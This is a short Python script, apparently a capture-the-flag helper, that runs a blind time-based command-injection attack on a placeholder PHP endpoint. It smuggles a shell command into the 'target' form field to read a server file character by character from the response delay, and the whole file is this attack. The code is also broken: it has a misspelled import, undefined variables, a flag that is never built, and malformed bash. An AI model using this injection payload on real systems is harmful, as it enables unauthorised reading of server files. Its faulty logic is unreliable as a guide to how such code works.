import request #Library to send http request
import time #Library to 

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-' #add more if you need
FLAG = '' #final content to get
URL = 'http://test.com:port/index.php'

start=0
end=100
#In this example, I will try to exploit command injection vulnerability
for index in range(start, end):
  for ch in CHARSET:
      #time based method, you can change the sleep() function into echo if the signal from the URL is visible
      CMD_INJECT = f"test.zip --help; cmd = `cat /*target.txt | cut -c {index}`; if [$cmd = '{ch}']; then sleep 2; else sleep 0; fi;#"
      try:
        r = requests.post(URL, data={'command': 'variable_based_on_function', 'target': CMD_INJECT}, timeout=5) 
        time_count = r.elapsed.total_seconds() #cast into integers
        print(f"Find a letter at index: {index} is {char} {{FLAG: {FLAG}}}")
        break
      except requests.exceptions.Timeout:
        print(f"Time out for character {c} at index {index}")

print(f"Final FLAG: {FLAG}")
